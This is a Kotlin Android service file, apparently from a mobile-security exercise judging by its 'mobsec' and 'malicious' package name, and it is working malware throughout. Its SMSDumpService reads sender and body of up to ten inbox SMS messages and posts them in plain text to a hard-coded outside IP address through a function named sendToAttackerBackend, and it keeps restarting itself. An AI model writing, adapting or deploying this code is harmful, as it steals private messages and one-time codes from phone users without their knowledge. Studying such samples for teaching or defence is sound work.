package com.example.mobsec_823.malicious

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.provider.Telephony
import android.net.Uri
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.lang.StringBuilder

class SMSDumpService : Service() {

    private val TAG = "SMSDumpService"

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "!!! SMS Service Triggered via onStartCommand !!!")
        Thread {
            try {
                val smsData = dumpSMSMessages()
                if (smsData.isNotEmpty()) {
                    Log.d(TAG, "SMS data collected (${smsData.length} chars). Sending...")
                    sendToAttackerBackend(smsData)
                } else {
                    Log.w(TAG, "SMS collection returned empty string (No messages or No permission)")
                }
            } catch (e: Exception) {
                Log.e(TAG, "CRITICAL ERROR in SMS Thread: ${e.message}")
            }
        }.start()

        return START_STICKY
    }

    private fun dumpSMSMessages(): String {
        val sb = StringBuilder("=== SMS DUMP ===\n")
        val uri: Uri = Uri.parse("content://sms/inbox")

        return try {
            contentResolver.query(uri, null, null, null, null)?.use { cursor ->
                Log.d(TAG, "Query successful, found ${cursor.count} messages")
                val bodyIdx = cursor.getColumnIndex(Telephony.TextBasedSmsColumns.BODY)
                val addrIdx = cursor.getColumnIndex(Telephony.TextBasedSmsColumns.ADDRESS)

                var count = 0
                while (cursor.moveToNext() && count < 10) {
                    val body = if (bodyIdx != -1) cursor.getString(bodyIdx) else "N/A"
                    val addr = if (addrIdx != -1) cursor.getString(addrIdx) else "Unknown"
                    sb.append("From: $addr | Msg: $body\n")
                    count++
                }
                sb.toString()
            } ?: "Cursor was null"
        } catch (e: Exception) {
            Log.e(TAG, "Security/Query Exception: ${e.message}")
            ""
        }
    }

    private fun sendToAttackerBackend(data: String) {
        try {
            val client = OkHttpClient()
            val request = Request.Builder()
                .url("http://47.129.144.9:8000/dump/sms")
                .post(data.toRequestBody("text/plain".toMediaType()))
                .build()

            client.newCall(request).execute().use { response ->
                Log.i(TAG, "Server Response: ${response.code}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Network Fail: ${e.message}")
        }
    }
}